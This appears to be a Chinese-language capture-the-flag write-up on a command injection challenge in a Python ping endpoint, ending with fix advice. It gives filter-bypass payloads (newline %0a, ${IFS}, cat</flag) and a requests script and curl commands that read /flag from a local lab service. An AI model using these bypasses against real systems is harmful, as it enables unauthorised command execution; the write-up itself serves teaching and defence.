# WriteUP - Hard 命令注入（过滤绕过）

## 漏洞原理

命令注入（Command Injection）是一种允许攻击者在服务器上执行任意操作系统命令的安全漏洞。当应用程序将用户输入直接拼接到系统命令中执行时，如果没有严格过滤，攻击者可以通过构造特殊输入来注入额外的命令。

本题中后端代码：
```python
cmd = f"ping -c 1 {sanitized}"
result = subprocess.check_output(cmd, shell=True, ...)
```

使用了 `shell=True`，且过滤了常见的命令注入字符，但仍存在绕过可能。

## 过滤分析

后端过滤的正则表达式为：
```python
BLACKLIST_CHARS = r'[;&|$(`)\'"\\]'
```

被过滤的字符包括：
- `;` — 命令分隔符
- `&` — 后台执行 / 逻辑与
- `|` — 管道符
- `$` — 变量扩展
- `(` `)` — 子shell
- `` ` `` — 反引号
- `'` `"` — 引号
- `\` — 反斜杠

## 绕过Payload详解

### 绕过思路

1. **空格绕过**：使用 `${IFS}`（Internal Field Separator）代替空格
2. **命令分隔**：使用换行符 `%0a` 或回车符 `%0d`（HTTP编码）
3. **重定向**：使用 `<` 和 `>` 进行输入输出重定向（`cat</flag`）

### Payload 1: 使用重定向读取文件

```
127.0.0.1%0acat</flag
```

这里 `%0a` 是URL编码的换行符，在shell中相当于执行新命令。`cat</flag` 不需要空格，也不需要被过滤的字符。

### Payload 2: 使用 `${IFS}` 代替空格

```
127.0.0.1%0acat${IFS}/flag
```

`${IFS}` 在bash中会被展开为空格或制表符，从而绕过空格限制。

### Payload 3: 利用环境变量拼接（进阶）

```
127.0.0.1%0aw=cat${IFS}/flag${IFS}%26%26echo${IFS}$w
```

（注：`%26` 是 `&` 的URL编码，但 `&` 被过滤，所以此路不通）

### 本题推荐的最简Payload

```
127.0.0.1%0acat</flag
```

或

```
127.0.0.1%0ahead</flag
```

## Python利用脚本

```python
import requests
import urllib.parse

url = "http://localhost:8083/ping"
payload = "127.0.0.1\ncat</flag"

data = {"ip": payload}
r = requests.post(url, data=data)
print(r.text)
```

## curl利用脚本

```bash
curl -X POST "http://localhost:8083/ping" \
  --data-urlencode "ip=127.0.0.1%0acat</flag"
```

或直接在浏览器/终端测试：
```bash
curl -X POST "http://localhost:8083/ping" -d "ip=127.0.0.1
cat</flag"
```

## 为什么这个payload有效？

1. `127.0.0.1` 是正常的ping目标
2. `\n`（换行符 `%0a`）在shell中开始一条新命令
3. `cat</flag` 使用输入重定向 `<` 将 `/flag` 文件内容作为 `cat` 的标准输入
4. 整个命令变成：
   ```bash
   ping -c 1 127.0.0.1
cat</flag
   ```
5. `subprocess.check_output` 使用 `shell=True`，bash会解释换行符并依次执行两条命令

## 修复建议

1. **不使用 `shell=True`**：
   ```python
   result = subprocess.check_output(["ping", "-c", "1", ip])
   ```
   使用列表传参，避免shell解析。

2. **严格的输入验证**：使用正则表达式只允许IP地址或合法域名：
   ```python
   import re
   if not re.match(r'^[a-zA-Z0-9.-]+$', ip):
       raise ValueError("Invalid IP/hostname")
   ```

3. **使用白名单**：仅允许特定的、预先验证的目标地址。

4. **权限最小化**：运行Web应用的服务账号应限制系统权限，禁止读取敏感文件。

5. **使用沙箱/容器隔离**：即使发生命令注入，攻击者也无法突破容器边界。
